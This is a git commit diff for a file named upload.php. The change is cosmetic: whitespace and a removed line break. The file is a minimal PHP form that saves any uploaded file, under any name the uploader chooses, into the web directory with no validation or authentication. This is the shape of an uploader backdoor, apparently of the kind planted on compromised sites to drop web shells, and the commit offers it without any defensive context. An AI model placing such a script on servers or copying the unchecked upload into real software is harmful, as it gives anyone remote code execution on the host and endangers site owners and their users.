e40d119c7108a21d56db11bbad7441e99a8d7874
Afrizal F.A <42967700+Afrizall@users.noreply.github.com>
2020-03-08 12:16:18 +0100

    Update upload.php

--- upload.php
+++ upload.php
@@ -1,5 +1,5 @@
 <form enctype="multipart/form-data" method="post">
   <input type="file" name="x">
   <input type="submit" value="Upload!">
- </form>
- <?php if(copy($_FILES['x']['tmp_name'],$_FILES['x']['name'])) { echo "<br>Uploaded!"; } ?>
+</form>
+<?php if(copy($_FILES['x']['tmp_name'],$_FILES['x']['name'])) { echo "Uploaded!"; } ?>
